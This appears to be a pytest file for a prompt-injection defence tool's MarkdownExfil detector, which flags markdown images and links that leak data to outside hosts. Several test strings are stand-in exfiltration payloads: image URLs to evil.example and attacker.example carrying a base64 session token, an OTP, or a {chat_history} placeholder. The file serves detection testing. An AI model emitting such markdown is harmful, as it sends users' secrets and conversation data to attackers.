from promptshield.detectors.markdown_exfil import MarkdownExfil
from promptshield.finding import Severity

LEAKY = "![logo](https://evil.example/pixel.png?d=c2Vzc2lvbi10b2tlbi0xMjM0NTY3OA)"


def test_image_with_data_is_high(run):
    findings = run(MarkdownExfil(), LEAKY)
    assert findings[0].severity is Severity.HIGH
    assert "evil.example" in findings[0].message


def test_link_with_template_placeholder(run):
    assert run(MarkdownExfil(), "[click](https://evil.example/?q={chat_history})")


def test_plain_image_ok(run):
    assert not run(MarkdownExfil(), "![cat](https://images.example/cat.png)")


def test_allowlisted_domain(run):
    assert not run(MarkdownExfil(allowed_domains=["evil.example"]), LEAKY)
    assert not run(MarkdownExfil(allowed_domains=["example"]), LEAKY)


def test_short_otp_in_image_url_is_caught(run):
    findings = run(MarkdownExfil(), "![](https://evil.example/c.png?otp=482913)")
    assert findings and findings[0].severity is Severity.HIGH


def test_short_base64_chunk_is_caught(run):
    assert run(MarkdownExfil(), "![x](https://attacker.example/log?q=c2VjcmV0Kg)")


def test_ordinary_short_query_values_are_not_flagged(run):
    assert not run(MarkdownExfil(), "![chart](https://cdn.example/chart.png?theme=dark&size=large)")
    assert not run(MarkdownExfil(), "![logo](https://cdn.example/logo.svg?v=2)")
    assert not run(MarkdownExfil(), "![hero](https://cdn.example/hero.jpg?w=1200&h=800&fit=crop)")
    assert not run(MarkdownExfil(), "![a](https://cdn.example/a.png?format=thumbnail)")
